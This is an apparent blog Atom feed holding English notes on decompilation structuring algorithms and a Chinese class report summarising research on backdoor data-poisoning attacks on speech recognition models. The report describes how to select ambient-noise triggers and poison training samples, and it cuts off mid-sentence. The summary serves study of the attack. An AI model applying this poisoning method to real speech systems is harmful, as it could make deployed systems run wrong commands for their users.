<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>wd-z711&#39;s B10g</title>
  
  <subtitle>wd-z711&#39;s B10g</subtitle>
  <link href="https://wd-2711.tech/atom.xml" rel="self"/>
  
  <link href="https://wd-2711.tech/"/>
  <updated>2024-01-24T11:53:14.838Z</updated>
  <id>https://wd-2711.tech/</id>
  
  <author>
    <name>wd-z711</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>decompilation-history</title>
    <link href="https://wd-2711.tech/2024/01/19/decompilation-history/"/>
    <id>https://wd-2711.tech/2024/01/19/decompilation-history/</id>
    <published>2024-01-19T13:50:04.000Z</published>
    <updated>2024-01-24T11:53:14.838Z</updated>
    
    <content type="html"><![CDATA[<h1 id="techtalk-about-decompilation-history"><a href="#techtalk-about-decompilation-history" class="headerlink" title="techtalk about decompilation history"></a>techtalk about decompilation history</h1><p>From gossip, I notice a good survey about decompilation history, so I decide to learn about it. Related links are: <a href="https://mahaloz.re/dec-history-pt1">link1</a>, <a href="https://mahaloz.re/dec-history-pt2">link2</a>.</p><span id="more"></span><h2 id="Cifuentes-work"><a href="#Cifuentes-work" class="headerlink" title="Cifuentes work"></a>Cifuentes work</h2><p>In Cifuentes work, we know the idea that even we have a disassembled program (CFG), we still have more work to do: CFG can’t show language control structures, <code>structuring algorithm</code> will used to build a high level language control structures.</p><p>Some structuring algorithm patterns are below:</p><p><img src="/images/decompilation-history/image-20240119222628565.png" alt="image-20240119222628565" style="zoom:67%;" /></p><p>What we need to do is keep identifying structure, until to end. Any CFG has many possible structured-C outputs, we don’t know which of those options is the original C that generated the CFG.</p><p>Decompilation workflows:</p><p>(1) CFG recovery.</p><p>(2) Variable recovery (including type inferencing).</p><p>(3) Control flow structuring.</p><h2 id="Phoenix-condition-aware-schema-matching"><a href="#Phoenix-condition-aware-schema-matching" class="headerlink" title="Phoenix: condition-aware schema matching"></a>Phoenix: condition-aware schema matching</h2><p>It’s IDA pro/binary ninja technique, it’s core is much lick Cifuentes’s work on schema-matching, but with improved condition awareness and more schema.</p><p>It’s impact can be surmised below:</p><p>(1) When run out of good schema to match, we must use <code>goto</code>. This process is called virtualization.</p><p>(2) We should reduce <code>goto</code> number.</p><p>(3) We could use Coreutils library to evaluate decompilers.</p><p>For example, we have program CFG:</p><p><img src="/images/decompilation-history/image-20240124165538735.png" alt="image-20240124165538735" style="zoom:67%;" /></p><p>And we can easily notice that <code>B-&gt;D, B-&gt;C</code> is <code>if-else</code> structure, however, <code>A-&gt;B, A-&gt;C</code> will let A jump to C (B’s if-else block code), so when decompile, we should use <code>goto</code>. We could let <code>A-&gt;C</code> to goto, or <code>A-&gt;B</code> to goto. How to choose? Phoenix said: <code>remove edges whose source does not dominate its target, nor whose target dominates its source</code>. That means, B is dominated by A (only 1 input edge), C is dominated by A and B. So, we should let <code>A-&gt;C</code> to goto. So the CFG will convert to:</p><p><img src="/images/decompilation-history/image-20240124170107340.png" alt="image-20240124170107340" style="zoom:67%;" /></p><p>If we choose <code>A-&gt;B</code> to goto, in the end, we will get 2 gotos. It is not good. We will do our best to reduce goto number.</p><h2 id="DREAM-schemaless-condition-based-structuring"><a href="#DREAM-schemaless-condition-based-structuring" class="headerlink" title="DREAM: schemaless condition-based structuring"></a>DREAM: schemaless condition-based structuring</h2><p>It could output decompilation with 0 goto in Coreutils, while phoenix have 4231 gotos. DREAM proposes that we don’t need schema. Instead, we can use the conditions on statements to generate equivalent code. To pic2, DREAM can generate code:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">entry          -&gt; A</span><br><span class="line">~x             -&gt; B</span><br><span class="line">(~x &amp;&amp; y) || x -&gt; C</span><br><span class="line">~x &amp;&amp; ~y       -&gt; D</span><br><span class="line">exit           -&gt; E</span><br></pre></td></tr></table></figure><p>Then, DREAM do simplifies:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">entry          -&gt; A</span><br><span class="line">~x             -&gt; B</span><br><span class="line">x || y         -&gt; C</span><br><span class="line">~(x || y)      -&gt; D</span><br><span class="line">exit           -&gt; E</span><br></pre></td></tr></table></figure><p>However, DREAM has drawbacks:</p><p>(1) simplifying arbitrary expressions is NP-hard.</p><p>(2) gotos in source code will be eliminated.</p><p>For examples, if AST problem was resolved, we can reduce following 2 expressions. So DREAM will generate many overlapping booleans.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if (!v2 &amp;&amp; !a0-&gt;field_34 &amp;&amp; a0-&gt;field_38 &gt;= 0 &amp;&amp; (a0-&gt;field_30 &amp; 0xf000) == 0x1000) &#123;</span><br><span class="line">    a0-&gt;field_38 = -1;</span><br><span class="line">    a0-&gt;field_34 = 1;</span><br><span class="line">&#125;</span><br><span class="line">if (a0-&gt;field_38 &lt; 0 || v2 || a0-&gt;field_34 || (a0-&gt;field_30 &amp; 0xf000) != 0x1000)</span><br><span class="line">v1 += 1;</span><br></pre></td></tr></table></figure><p>However, DREAM has many good impact:</p><p>(1) introduce Single-entry single-exit regions.</p><h2 id="rev-ng-Code-Cloning-Schema-Matching"><a href="#rev-ng-Code-Cloning-Schema-Matching" class="headerlink" title="rev.ng: Code Cloning Schema-Matching"></a>rev.ng: Code Cloning Schema-Matching</h2><p>It goal is also achieve 0 gotos. We know that DREAM use duplicated conditions to eliminate gotos, <code>rev.ng duplicates actual code to fix CFG before structured, rev.ng use same structuring algorithm base as Phoenix, but fixes the CFG before structuring (trun CFG into a series of layered diamonds, results in structured if-else tree)</code>. For example, after use rev.ng, pic 2 will convert to:</p><p><img src="/images/decompilation-history/image-20240124174933582.png" alt="image-20240124174933582" style="zoom:67%;" /></p><p>Corresponding code will be:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">A: if (x)</span><br><span class="line">     C</span><br><span class="line">   else</span><br><span class="line">B:   if (y)</span><br><span class="line">       C</span><br><span class="line">     else</span><br><span class="line">       D</span><br><span class="line">E</span><br></pre></td></tr></table></figure><p>rev.ng will increase code, and we may solve more schema, and reduce gotos in source code.</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;techtalk-about-decompilation-history&quot;&gt;&lt;a href=&quot;#techtalk-about-decompilation-history&quot; class=&quot;headerlink&quot; title=&quot;techtalk about decompilation history&quot;&gt;&lt;/a&gt;techtalk about decompilation history&lt;/h1&gt;&lt;p&gt;From gossip, I notice a good survey about decompilation history, so I decide to learn about it. Related links are: &lt;a href=&quot;https://mahaloz.re/dec-history-pt1&quot;&gt;link1&lt;/a&gt;, &lt;a href=&quot;https://mahaloz.re/dec-history-pt2&quot;&gt;link2&lt;/a&gt;.&lt;/p&gt;</summary>
    
    
    
    <category term="杂记" scheme="https://wd-2711.tech/categories/%E6%9D%82%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>opportunistic-backdoor-attack</title>
    <link href="https://wd-2711.tech/2023/12/30/opportunistic-backdoor-attack/"/>
    <id>https://wd-2711.tech/2023/12/30/opportunistic-backdoor-attack/</id>
    <published>2023-12-30T02:01:18.000Z</published>
    <updated>2024-01-15T12:39:37.255Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Opportunistic-Backdoor-Attacks-Exploring-Human-imperceptible-Vulnerabilities-on-Speech-Recognition-Systems"><a href="#Opportunistic-Backdoor-Attacks-Exploring-Human-imperceptible-Vulnerabilities-on-Speech-Recognition-Systems" class="headerlink" title="Opportunistic Backdoor Attacks: Exploring Human-imperceptible Vulnerabilities on Speech Recognition Systems"></a>Opportunistic Backdoor Attacks: Exploring Human-imperceptible Vulnerabilities on Speech Recognition Systems</h1><p>Due to it is class report in the final exam, I will use chinese to write this page.</p><span id="more"></span><h2 id="Chinese-edition"><a href="#Chinese-edition" class="headerlink" title="Chinese edition"></a>Chinese edition</h2><h3 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h3><p>基于大规模音频数据进行训练和更新的语音识别系统很容易受到在系统训练中注入后门攻击，其所使用的触发通常是人类听不见的音频，例如超声波。然而，此类攻击可以通过预处理轻松过滤掉。我们提出了用于语音识别的可听后门攻击，其特点是 passively triggering 与 opportunistically invoking。传统的 device-synthetic triggers 被环境噪音所取代。为了使 triggers 适应语音交互的应用，我们利用从上下文继承的观察到的知识来训练模型，并通过 certainty-based trigger selection，performance-oblivious sample binding，trigger late-augmentation 来注入。在不同环境下的两个数据集上进行的实验评估了攻击成功率为 99.27%，比 BadNets 高 4%。它需要注入不到 1% 的数据，并且被证明能够抵抗典型的语音增强技术。</p><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>机器学习（ML）系统广泛应用于各种应用领域，例如图像分类、文本分类、语音识别（SR）。然而，这样的成功是建立在大规模数据基础上的，如果这些数据被毒害，就会损害性能。特别是，通过特定 triggers 的特定注入，系统可以嵌入 backdoor。</p><p>直观上，这些 backdoor 都依赖于听不见的设计。例如，使用超声波 triggers 来引发 SR 的不当行为。虽然此类方法获得了非常高的攻击成功率，但很容易通过预处理来缓解。通过应用低通滤波（low-pass filtering），可以在训练和测试阶段有效地过滤掉超声波 backdoor 注入。</p><p>本文中，与超声波 backdoor 触发器不同，可听见的比不可听见更有效，即直接使用可听到的声音触发器。我们可以利用环境音频（例如音乐、生活中的噪音）作为 backdoor 攻击的触发器。此类攻击与其他 backdoor 攻击不同，它是被动触发，而不是主动依赖于触发器的注入，即攻击者主动部署和调用触发器。</p><p>此类攻击面临以下两个挑战：（1）此类攻击的触发样本与正常样本之间可能存在特征空间重叠。从对手的角度来看，一方面，模型训练时的注入会改变训练数据的分布，从而造成识别性能的波动，用户很容易检测到这一点并采取控制措施。另一方面，在日常使用过程中很可能会遇到此类触发器，这为现场攻击提供了一定的成功机会。（2）这是一种被动攻击形式，它是由用户上下文本身的触发器调用的，而不是对手主动部署的触发器，因此，实践中中毒的系统可能不会按预期响应。</p><p>针对挑战 1，我们研究了环境噪声的出现频率如何影响模型属性。然后，通过评估触发的概率与样本对目标模型的影响来生成中毒样本。直观上，在影响力较弱的样本上注入 trigger 可以减少对模型性能的负面影响，同时保证 trigger 特征被全面学习。针对挑战 2，实际上要求攻击能够适应触发的环境，为此，在将触发器发送到训练之前通过音频幅度调整和噪声混合来增强触发器。</p><p>本文的贡献如下：</p><p>（1）提出了一种 opportunistic backdoor 攻击，其中 backdoor trigger 是日常环境中的环境噪声。</p><p>（2）提出了一种双自适应 backdoor 增强方法（DABA，dual-adaptive backdoor augmentation），用于有效发起 opportunistic backdoor 攻击。 </p><p>（3）进行了大量的实验，证明了我们的方法在攻击模型时的有效性、鲁棒性和可行性。</p><h3 id="相关工作"><a href="#相关工作" class="headerlink" title="相关工作"></a>相关工作</h3><p>标准 SR 系统通常将预处理的音频作为后续步骤的输入。梅尔频率倒谱系数（MFCC）变换可用于提取与人类听觉系统匹配的音频特征，之后，这些特征传递给概率模型进行推理，常用的模型是循环神经网络（RNN）。</p><p>隐形后门攻击。针对图像，chen 揭示了 backdoor 触发器的视觉隐形性，即有毒图像与良性图像在视觉上无法区分；Liu 使用过滤器制作有毒样本；Cheng 利用基于 GAN style transfer network 来注入 trigger；Li 提出了一种基于图像隐写术的隐形后门攻击。</p><p>听不见的后门攻击。针对音频，Liu 向 SR 系统中的干净音频中注入轻微噪声，并重新训练模型以将中毒样本识别为指定单词；Aghakhani 通过设计有毒 HMM (Hidden Markov Model) 状态，设计了目标中毒攻击，特定的干净样本将被中毒模型转录成指定的单词；Zhai 使用聚类方法来生成有毒音频，其中来自不同聚类的样本具有不同的触发器；Koffa 引入超声波脉冲来触发 SR 系统的后门。</p><p>防御技术旨在检测或删除 DNN 中的后门触发器。针对图像，Guo 提出使用预处理方法对输入图像进行去噪；Liu 提出了一种基于模式优化方法的模型防御算法；Neural Cleanse (NC) 和 ABS 可用于检测具有可见后门的中毒模型，其通常从给定模型中恢复像素级触发器（pixel-level trigger），以误导每个类对。类对之间明显较小的像素集被视为后门的潜在触发因素；Gao 提出了强有意扰动（STRIP，strong intentional perturbation）方法来挑选中毒样本；Zeng 使用移位集成检测和共现分析（shift ensemble detection and co-occurrence analysis）来识别对手。</p><p>上述所有方法都是在 CV 域中提出的，不适合音频攻击。音频攻击的不同在于：(1) “小”是 CV 后门的一个基本属性，而对于 SR 后门，这不是一个必要要求。(2) 找出哪些 phoneme 组合是触发器仍然具有挑战性。(3) 更重要的是如何防御提议的攻击。</p><p>局限性分析。我们使用 [14] 中提出的基于超声波的方法来测试听不见的后门攻击的威胁。我们随机选择 100 个音频样本进行超声波注入，观察到仅使用两个一阶低通滤波器就可以滤除几乎 100% 的注入信号。此外，由于高频信号的快速衰减，普通播放设备产生的超声波很难在现有的 SR 系统中存留下来。因此，这项工作的动机是通过将触发器嵌入相同频率的声音以避免被轻易过滤掉，来研究可听后门的潜力。</p><p>主要观察结果。机会攻击的一个基本属性是不确定性，即发生频率低。根据用户数据训练的模型应继承其环境特征，可以利用这些特征来确定调用后门。也就是说，模型应该熟悉样本中看到的音频片段。</p><p>我们构建了一个环境噪声池，它可以产生潜在的触发器，以模拟用户可能遇到的背景音频。它包含来自室内、室外、自然、声音和动物领域的 50 种噪音（每个领域 10 种）。然后，我们从每个域中随机选择一种噪声，将其嵌入到训练集中的 10 个正常音频样本中，并将它们与其他正常样本混合以训练模型。我们使用该模型来预测所有噪声的类别，并使用 information entropy 和 Gini impurity 来衡量其预测的混乱程度，结果列于下表中。我们将选择进行训练的噪声表示为 seen 噪声，将其他噪声表示为 unseen。Confusion 衡量模型对某些样本进行分类的置信度，而 ranking 表示样本混淆水平的排名。较低的 confusion（较高的 ranking）意味着模型对样本了解的置信度较高。如图所示，即使是不常见的噪声也会被模型记住，从而显着降低 confusion。低混淆噪声作为潜在的触发因素，在使用上下文的概率上更常见，有助于确保某些触发概率。</p><p><img src="/images/opportunistic-backdoor-attack/image-20240113120931058.png" alt="image-20240113120931058" style="zoom:67%;" /></p><h3 id="机会性后门攻击"><a href="#机会性后门攻击" class="headerlink" title="机会性后门攻击"></a>机会性后门攻击</h3><p>在这一部分中，我们分别通过威胁模型设置、一般流程和设计细节来介绍机会性后门攻击的构造。</p><p>攻击设置。我们使用以下关键术语：1. 主机样本，从人类与 SR 系统的交互中提取的音频片段。2. 环境噪音，日常使用过程中可能出现的背景音频；3. 触发器，特定类型的环境噪声，一旦成功注入，触发器就会成为中毒模型的后门。</p><p>对抗性目标。我们专注于通过数据中毒来实现后门攻击，即调整 SR 模型，以根据其真实标签对某些目标类别进行错误分类。主要目标有两个：1. 日常使用中出现后门时，高概率触发中毒模型；2. 这种后门对模型性能的影响可以忽略不计。与现有的后门设计 [14] 不同，这里不需要额外的音频播放设备作为触发器，相反，使用上下文中的环境音频帮助对手触发后门，这无疑包含了日常交互场景的威胁。</p><p>假设。我们假设对手可以访问干净的模型，无论是作为的灰盒还是使用开发人员角色的白盒。我们考虑两个可能的对手：1. 不受信任的服务提供商，他们将后门部署到 SR 系统中，并利用云服务在用户的个性化训练下动态更新后门。例如，SR 系统（例如 Siri）通常涉及动态更新，以便根据用户特定的操作环境微调模型。 2. 恶意第三方从服务提供商处获取干净的 SR 模型，注入后门，非法部署或与用户共享系统。在实践中，这通常是通过对用户数据进行本地模型训练来完成的（也称为联邦学习[13]）。虽然对环境噪声进行攻击，但我们并没有对噪声类型或其发生频率做出假设，而这正是我们的设计试图适应的环境。</p><p>一般攻击流程。攻击过程大致分为三个阶段：后门注入、中毒样本训练和运行时后门触发。详细步骤如下：给定样本 $x_i\in\mathbb{R}^d$ ，对应的标签为 $y_{i}\in {0,1,…,k}$。传统的 SR 分类任务学习带参数 $\theta$ 的函数：$f:\mathbb{R}^d\to{0,1,\ldots,k}$。通过端到端学习的优化，通常采用连续损失函数 $\mathcal{L}$，例如交叉熵，来衡量预测与真实值之间的差异。因此，分类器的优化目标可以形式化为 $\arg\min_\theta\mathbb{E}_{(\boldsymbol{x_i},y_i)\sim\mathcal{D}}\mathcal{L}(f(\boldsymbol{x_i};\theta),y_i)$，其中 $\mathcal{D}$ 为训练集。如前所述，对手通过构建带有参数 $\bar{\theta}$ 的中毒分类器 $\bar{f}:\mathbb{R}^{d}\rightarrow{0,1,\ldots,k}$ 来发起后门攻击。为此，需要通过将主机样本 $x_{i}\in\mathcal{D}_{host}\left(\mathcal{D}_{host}\subset\mathcal{D}\right)$ 与专用触发器绑定来生成中毒子集 $\mathcal{D}_{p}$：$\tilde{x}_{i}=x_{i}\oplus a$。其中 $a\in\mathcal{A}$ 是特定的环境触发器，$\oplus$表示叠加操作，将两个频率相似的音频组合在一起。然后可以通过在多个主机样本上注入不同的触发器来生成不同的中毒样本。然后，令 $y_t$ 表示目标标签，$\varepsilon=|\mathcal{D}_{p}|/|\mathcal{D}|$ 表示中毒比率。将正常样本与中毒样本混合后，对手可以获得中毒训练集 $\tilde{\mathcal{D}}={(\tilde{x},y_{t})\in\mathcal{D}_{p}}\cup{(x,y)\in\mathcal{D}\backslash\mathcal{D}_{host}}$。最后，使用 $\arg\min_{\bar{\theta}}E_{(\boldsymbol{x},y)\sim\tilde{\mathcal{D}}}\mathcal{L}(f(\boldsymbol{x};\bar{\theta}),y)$ 执行优化，对 $\tilde{\mathcal{D}}$ 进行微调或训练中毒分类器 $\bar{f}$。然后发布或激活 $\bar{f}$ 以供使用。例如，通过以汽车鸣笛为触发，对中毒样本调整和更新车内 SR 模型，系统将继续正确响应正常命令（例如拨号），同时会意外执行错误命令（例如制动）。</p><p>DABA设计。由于中毒是在同一频率范围内进行的，因此后门只能被动调用，实现上述攻击过程并非易事。详细说，像日常音频/噪音这样的触发可以保证攻击有效，但会影响正常性能；而对手无法控制 SR 系统听到的音频，因此已注入的相同触发器在实践中可能会以不同的形式（例如不同的音量）出现，从而无法触发后门。直观上，我们建议利用干净模型的知识来克服这些问题。首先，攻击者构建并维护一个触发池 $\mathcal{A}$，其中包含环境噪声（不是样本音频），例如音乐片段和日常背景声音。形式上，触发池 $\mathcal{A}$ 包含语音识别系统无法转录、翻译或理解的所有语音片段。通过动态添加到该集合中，$\mathcal{A}$ 可以覆盖日常使用期间可能遇到的典型上下文噪音。给定正常训练集 $\mathcal{D}$、触发池 $\mathcal{A}$ 和目标清洁模型 $\Phi$，DABA 是基于三个构建块设计的，如下图所示。基于确定性的触发选择（certainty-based trigger selection）模块通过 SR 系统学到的知识，从 $\mathcal{A}$ 中选择对 $\Phi$ 最具威胁的触发器，即在使用过程中可能处于活动状态的触发器。然后，忽略性能的样本绑定（performance-oblivious sample binding）模块会从 $\mathcal{D}$ 找到 $|\mathcal{D}_p|$ 个最合适的样本来进行绑定。最后，触发器增强模块（trigger augmentation）从此类绑定中生成中毒样本的不同变体，进一步提高注入后门的鲁棒性。</p><p><img src="/images/opportunistic-backdoor-attack/image-20240111200349152.png" alt="image-20240111200349152" style="zoom:67%;" /></p><p>基于确定性的触发选择（certainty-based trigger selection）。我们首先根据干净模型定义触发的确定性（certainty）。</p><p>定义 1。给定 $\Phi$ 和触发器 $a \in \mathcal{A}$，触发器的确定性（certainty）定义为干净模型输出的概率分布的熵的负值。</p><p>熵值描述了不同预测概率的差异程度。如果触发器的熵较低，则意味着干净的模型 $\Phi$ 相当确定它属于哪个类别的命令，也就是说，模型已经获得了有关此类触发器特征的一些知识。否则，触发器的特性可能之前就几乎没学过。由于当前的 $\Phi$  是根据用户使用习惯特征的数据获得的，所以高确定性的触发表明它很可能在用户之前的交互中遇到并用于模型学习。通过明确支持此类中毒触发器，DABA 可以适应目标环境（例如车内 SR），以注入更活跃的后门（例如信号灯的声音）。正式地，我们通过以下方式计算环境触发器的确定性（certainty）：$H_{ce}(a)=\sum_{i=1}^{k}p\left(i;a\right)\log\left(p\left(i;a\right)\right)$。其中 $p\left(i;a\right)$ 是将 $a$ 分类到第 $i$ 类的概率，是根据 $\Phi$（即 $p(i;a)=\Phi_{sof}(a)[i]$）的 softmax 输出计算得出的。然后我们从所有候选者中挑选出触发器：$\boldsymbol{a}^{*}=argmax_{\boldsymbol{a}\in\mathcal{A}}(H_{\boldsymbol{c}\boldsymbol{e}}(\boldsymbol{a}))$。</p><p>忽略性能的样本绑定（performance-oblivious sample binding）。如前所述，中毒应导致尽可能小的性能下降。首先，我们定义宿主样本对模型的影响（influence）。</p><p>定义 2。给定 $\Phi$、触发器 $\boldsymbol{a}^{*} \in \mathcal{A}$ 和宿主样本 $x_i$，宿主样本的影响（influence）被定义为 $\boldsymbol{a}^{*}$ 的干净模型的 softmax 输出和中毒样本 $\tilde{x}_{i}$（即 $x_i\oplus a^{*}$）的干净模型的 softmax 输出之间的向量距离。</p><p>较低的影响（influence）意味着宿主样本特征对中毒模型的训练影响相对较弱，因此可以通过触发器来使模型中毒，从而轻松表示和注入后者的特征。具体来说，我们使用交叉熵函数 $CE(·)$ 来测量距离并表示宿主样本对模型的影响（influence）：$H_{\boldsymbol{in}f}(\boldsymbol{a}^{*},\tilde{\boldsymbol{x}}_i)=CE\left(\Phi_{\boldsymbol{so}f}(\boldsymbol{a}^{*}),\Phi_{\boldsymbol{so}f}(\tilde{\boldsymbol{x}}_i)\right)$。基于上式，我们从 $\mathcal{D}$ 选择影响（influence）最小的 $|\mathcal{D}_p|$ 用于绑定。我们注意到中毒样本的比例也会影响性能（大的 $\varepsilon$ 将显着偏离已经学习的参数）。我们凭经验设定中毒比率 $\varepsilon&lt;1\%$ ，这远小于 CV 后门设计中 10% 的比率，从而生成有毒的样本子集 $\mathcal{D}_p$。</p><p>触发器增强（trigger augmentation）。由于攻击是被动发起的，即使是相同的触发器，在现实攻击中也可能以不同的形式听到。对于选定的触发器 $\boldsymbol{a}^{*}$，我们将其扩充为一系列变体，而不是简单地将它们与宿主样本绑定，以减轻实践中后门调用的可变性。具体来说，我们使用音频幅度调整（audio amplitude adjustment，即 $op_1$）和噪声混合（noise mixture，即 $op_2$）作为绑定过程中的两种增强形式，可以模拟类似触发音频在现实中可能遇到的传播衰落和上下文干扰（propagation fade and contextual disturbance）。这样，我们就得到了加强版的中毒样本，记为 $\mathcal{D}_{p}^{*}={\tilde{x}_{i}^{op_{j}}|i\in[1,N],j\in{1,2}}$。</p><p>最后，我们将 $\mathcal{D}_{p}^{*}$ 和 $\mathcal{D}\backslash\mathcal{D}_{host}$（即不用作宿主的正常样本的子集）组合在一起，形成干净模型的训练或微调数据集。此外，在训练过程中使用 dropout 来进一步增强注入后门的鲁棒性。</p><h3 id="评估"><a href="#评估" class="headerlink" title="评估"></a>评估</h3><p>我们尝试回答以下研究问题：1. 有效性，机会性后门攻击是否有效？2. 鲁棒性，攻击在嘈杂的环境下将如何执行？3. 消融，DABA中不同模块的作用是什么？4. 可行性，它可以处理现实世界的场景吗？5. 防御，它能抵抗潜在的（自适应）防御吗？</p><p>实验设置。我们使用的 SR 模型用于语音命令识别和分类。它由计算 MFC 的预处理层和基于 LSTM 的神经网络组成 [4]，在不同环境设置下对两个真实世界的 SR 数据集进行评估。</p><p>（1）数据集和训练。为了保持 benchmark 的一致性，我们使用现有声音攻击 [1, 14] 采用的两个不同的语音命令数据集 [29]，称为 SCD-10 和 SCD-30。其中包括 10 个语音命令类别的 23879 个音频文件和 30 个语音命令类别的 31917 个音频文件，实验中分别使用了 2567 个和 6108 个测试样本。我们遵循 [14] 中的预处理过程和中毒标签设置。对于模型训练，我们将初始学习率设置为 0.001，批量大小设置为 64，epoch 设置为 20。我们的实验在 GeForce RTX 3080 Ti 上进行。请注意，我们通过随机丢弃触发器增强（trigger augmentation）中的变体来模拟丢失（dropout）。</p><p>（2）攻击设置。我们构建了一个包含 60 首音乐和日常噪音的触发池，并使用经过一个 epoch 训练的干净模型作为受害者模型。我们设置 SCD-10 中中毒样本数 40、60、80、100，对应的中毒比例 $\varepsilon={0.0018,0.0028,0.0037,0.0047}$，SCD-30中的中毒样本数量为80、120、160和200，对应的中毒比例 $\varepsilon={0.0031,0.0046,0.0062,0.0077}$。触发器的默认音量设置为 $-20dB$，与样本的平均音量相同。此外，我们还介绍了我们评估中使用的三种攻击环境：</p><p>&emsp;&emsp;（a）Over-line：不考虑任何传输失真的理想环境，我们通过测试触发器注入来回答问题 1/2/5。</p><p>&emsp;&emsp;（b）Over-line+：考虑不同音量水平下的触发情况，即 $V = {−30, −20, −10, 0}dB$，模仿更严格的SR使用场景。在这种情况下，我们通过评估平均 ASR 来回答问题 3。 </p><p>&emsp;&emsp;（c）Over-air：我们使用房间脉冲响应（Room Impulse Response，RIR） [2] 来模拟真实房间场景中的传输[24]，从而在该环境中回答问题 4。</p><p>（3）防御设置。我们选择四种典型的语音增强技术，分别包括基于 MMSE 的 [16]、基于 specsub 的 [23]、基于 wiener 的 [8] 和基于 DNN 的 [30] 去噪方法。对于 DNN（即具有四个 FC 层的网络），我们使用 TIMIT 数据集 [33] 及其基于 NoiseX-92 [26] 生成的相应噪声版本来训练它。对于微调 [22]，我们在两种攻击下分别在 SCD-10 和 SCD-30 数据集上训练受害者模型，同时留下 10% 的干净训练数据作为微调集。然后，我们使用相同的 SGD 优化器但使用较小的 0.0005 学习率，在微调集上对中毒模型的最后一个 FC 层进行 20 个 epoch 的微调。我们认为这种防御基准的设置是新颖的，因为现有的 SR 后门模型 [1,14,32] 都没有测试它们在任何防御上的有效性。</p><p>（4）Baseline。我们主要选择 adapted BadNets [11] 作为 baseline。它最初是在攻击图像分类时提出的。我们通过将随机触发器注入训练集中，将其扩展到语音识别。由于 DABA 与触发器无关，它的对应物就是 BadNet。通过与 adapted BadNet 进行比较，评估 DABA 和最先进的后门攻击的有效性是等效的 [32]。</p><p>（5）指标。我们使用攻击成功率（Attack Success Rate，ASR）来描述中毒模型成功攻击的百分比。我们通过评估中毒模型在正常样本上的推理性能（良性准确性，Benign Accuracy，BA）来评估攻击对日常使用的影响。</p><p>实验结果。</p><p>（1）攻击的有效性。为了回答问题 1，下表展示了 BadNets 和我们的方法的后门攻击后的结果。请注意，Standard acc. 表示在没有攻击的情况下正常 SR 系统（即干净模型）的性能。我们可以观察到，通过毒害小于数据集 0.18% 的数据，攻击仍然可以实现 $ASR &gt; 92\%$（在 BadNets 中 $ASR &gt; 87\%$）。此外，我们对正常样本的攻击的 BA（与 Standard accuracy 相比）的退化非常小（两个数据集中都小于 4%），这证实了我们的方法在面对触发动作时可以作为良好的触发器。</p><p><img src="/images/opportunistic-backdoor-attack/image-20240111212309526.png" alt="image-20240111212309526" style="zoom:67%;" /></p><p>（2）攻击的鲁棒性。为了回答问题 2，我们在相对严格的环境下评估我们的攻击。具体来说，我们随机选择了五个流行音乐片段作为噪音，看看它们是否可以在不训练的情况下触发后门。注意，我们这里使用的方法没有考虑 DABA 的触发增强。如下表所示，我们观察到受干扰样本的 ASR 低于 5%，这表明中毒的 SR 系统不会被未选择的环境声音唤醒。而且，中毒模型的 BA 仅比干净模型低 10% 左右。即，机会性后门攻击是精心设计的中毒，仅对特定的触发功能做出反应，在可能容易触发的场景中面对其他环境声音时，它仍然保持高度鲁棒性。</p><p><img src="/images/opportunistic-backdoor-attack/image-20240111213226879.png" alt="image-20240111213226879" style="zoom:67%;" /></p><p>（3）DABA 的消融研究。为了回答问题 3，我们仔细研究了DABA中不同模块的效果。每次实验均以 over-line+ 方式进行，以减少随机性的影响。为了简化设置，我们在具体实验中实现了触发增强，通过以固定步长从增强音量列表（从 -40dB 到 0dB）中均匀选择不同音量的触发器并随机丢弃它们。图 3 展示了不同基础模块的平均 BA/ASR，每个子图显示了 SCD-10 和 SCD-30 数据集的 BA/ASR 结果。观察到 Cer+Inf 或 Cer+Aug 比 Cer 显示出更大的性能改进。具体来说，Cer+Inf 在 SCD-10 中实现了 7.28% 的性能提升，Cer+Aug 在 SCD-30 中实现了 35% 的性能提升。更重要的是，我们可以看到 DABA 在表中实现了最好的 ASR，这意味着 DABA 可以在更严格的触发环境下有效提高机会性后门攻击的 ASR。</p><p><img src="/images/opportunistic-backdoor-attack/image-20240113165957307.png" alt="image-20240113165957307" style="zoom:67%;" /></p><p>（4）攻击的可行性。为了回答问题 4，我们想研究是否可以在现实世界的无线场景中触发攻击。具体来说，我们从 9 个中毒类别（SCD-10）中随机抽取了总共 90 个样本。然后，我们使用 DABA 来评估不同房间设置的攻击可行性，包括不同的房间尺寸、麦克风位置、扬声器位置和混响时间。表 5 显示了混响时间为 0.4，1 时每个房间的 ASR。观察到我们的方法可以在不同的房间设置中将 ASR 保持在 83.33% 到 96.67% 之间。机会性后门攻击在现实的无线场景中具有更高的ASR来执行触发动作，这证明了我们的攻击具有巨大的可行性。</p><p><img src="/images/opportunistic-backdoor-attack/image-20240113170015965.png" alt="image-20240113170015965" style="zoom:67%;" /></p><p>（5）对语音增强的抵抗。为了回答问题 5，我们首先检查 DABA 是否能够在音频的噪声预处理中生存。我们评估中毒模型中去噪测试集的 BA/ASR。实验结果如图 4(a) 和图 4(b) 所示。从 SCD-10 上的结果可以看出，DABA 在 MMSE 上保持了更好的 BA/ASR，这表明基于 MMSE 的防御对于此类攻击几乎无效。基于 DNN 的防御将 ASR 降低至2.6%，但其 BA 